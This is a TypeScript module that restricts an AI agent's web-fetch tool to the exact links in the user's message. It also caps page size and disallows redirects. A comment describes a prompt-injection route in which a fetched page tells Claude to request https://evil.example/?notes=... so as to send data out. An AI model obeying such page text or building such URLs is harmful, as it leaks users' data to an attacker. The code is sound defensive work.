import { webFetchTool } from 'agents/webfetch/ai-sdk';

// A ready-made tool from the Agents SDK: read one web page as Markdown (HTML is converted by env.AI).
// It refuses private and local addresses, and wraps the page in <untrusted_web_content> for the model.
export function readLink(env: Env, question: string) {
	const allowed = linksIn(question);
	const webFetch = webFetchTool({
		binding: env.AI,
		pageChars: 8000, // what Claude reads per call: about 2,000 tokens, so one page can't run up the bill
		maxBytes: 1_000_000, // stop reading a page past 1 MB
		timeoutMs: 15_000, // give up on a slow site after 15 seconds
		maxRedirects: 0, // a redirect could lead anywhere: read only the exact page you named
	});
	return {
		...webFetch,
		// Only the exact links you typed. A page could tell Claude to fetch https://evil.example/?notes=...,
		// and that URL isn't one of yours, so it's refused: nothing leaves through a made-up link.
		execute: (input: Parameters<typeof webFetch.execute>[0], options: Parameters<typeof webFetch.execute>[1]) => {
			if (!allowed.has(normalize(input.url))) {
				throw new Error(`Only the exact links in the user's message can be read, and ${input.url} isn't one of them.`);
			}
			return webFetch.execute(input, options);
		},
	};
}

// The http(s) links in a message, written the one way URL writes them (so "example.com" and "example.com/" match).
function linksIn(text: string) {
	const found = text.match(/https?:\/\/[^\s<>"'`]+/g) ?? [];
	return new Set(found.map((link) => normalize(link.replace(/[.,;:!?)\]]+$/, ''))).filter(Boolean));
}

function normalize(url: string) {
	try {
		return new URL(url).href;
	} catch {
		return ''; // not a URL at all: matches nothing
	}
}
